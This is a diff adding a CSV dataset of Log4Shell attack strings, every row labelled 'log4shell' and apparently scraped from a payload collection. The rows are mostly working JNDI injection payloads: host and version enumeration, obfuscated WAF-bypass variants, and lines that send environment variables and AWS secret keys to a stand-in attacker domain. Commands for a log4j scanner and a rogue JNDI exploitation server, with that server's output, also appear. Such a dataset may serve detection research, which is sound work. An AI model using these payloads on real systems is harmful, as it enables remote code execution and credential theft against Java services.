@@ -1,0 +1,43 @@
+payload,label,source
+docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app,log4shell,payloads_all_the_things
+"public String index(@RequestHeader(""X-Api-Version"") String apiVersion) {",log4shell,payloads_all_the_things
+"logger.info(""Received a request for API version "" + apiVersion);",log4shell,payloads_all_the_things
+"return ""Hello, world!"";",log4shell,payloads_all_the_things
+# Identify Java version and hostname,log4shell,payloads_all_the_things
+${jndi:ldap://${java:version}.domain/a},log4shell,payloads_all_the_things
+${jndi:ldap://${env:JAVA_VERSION}.domain/a},log4shell,payloads_all_the_things
+${jndi:ldap://${sys:java.version}.domain/a},log4shell,payloads_all_the_things
+${jndi:ldap://${sys:java.vendor}.domain/a},log4shell,payloads_all_the_things
+${jndi:ldap://${hostName}.domain/a},log4shell,payloads_all_the_things
+${jndi:dns://${hostName}.domain},log4shell,payloads_all_the_things
+# More enumerations keywords and variables,log4shell,payloads_all_the_things
+java:os,log4shell,payloads_all_the_things
+docker:containerId,log4shell,payloads_all_the_things
+web:rootDir,log4shell,payloads_all_the_things
+bundle:config:db.password,log4shell,payloads_all_the_things
+usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing],log4shell,payloads_all_the_things
+[--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST],log4shell,payloads_all_the_things
+python3 log4j-scan.py -u http://10.10.10.10:8081 --run-all-test,log4shell,payloads_all_the_things
+python3 log4j-scan.py -u http://10.10.10.10:8080 --waf-bypass,log4shell,payloads_all_the_things
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://10.10.10.10:1389/a},log4shell,payloads_all_the_things
+# using lower and upper,log4shell,payloads_all_the_things
+${${lower:jndi}:${lower:rmi}://10.10.10.10:1389/poc},log4shell,payloads_all_the_things
+${j${loWer:Nd}i${uPper::}://10.10.10.10:1389/poc},log4shell,payloads_all_the_things
+${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce},log4shell,payloads_all_the_things
+# using env to create the letter,log4shell,payloads_all_the_things
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//[ATTACKER.DOMAIN.TLD]/a},log4shell,payloads_all_the_things
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//[ATTACKER.DOMAIN.TLD]/a},log4shell,payloads_all_the_things
+${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/,log4shell,payloads_all_the_things
+# AWS Access Key,log4shell,payloads_all_the_things
+${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY},log4shell,payloads_all_the_things
+- Rogue JNDI LDAP/RMI exploitation server,log4shell,payloads_all_the_things
+"java -jar target/RogueJndi-1.1.jar --command ""whoami"" --hostname ""10.10.10.10""",log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/ to artsploit.controllers.RemoteReference,log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/o=reference to artsploit.controllers.RemoteReference,log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/o=tomcat to artsploit.controllers.Tomcat,log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/o=groovy to artsploit.controllers.Groovy,log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/o=websphere1 to artsploit.controllers.WebSphere1,log4shell,payloads_all_the_things
+"Mapping ldap://10.10.10.11:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1",log4shell,payloads_all_the_things
+Mapping ldap://10.10.10.11:1389/o=websphere2 to artsploit.controllers.WebSphere2,log4shell,payloads_all_the_things
+"Mapping ldap://10.10.10.11:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2",log4shell,payloads_all_the_things
+- JNDI exploitation helper toolkit,log4shell,payloads_all_the_things
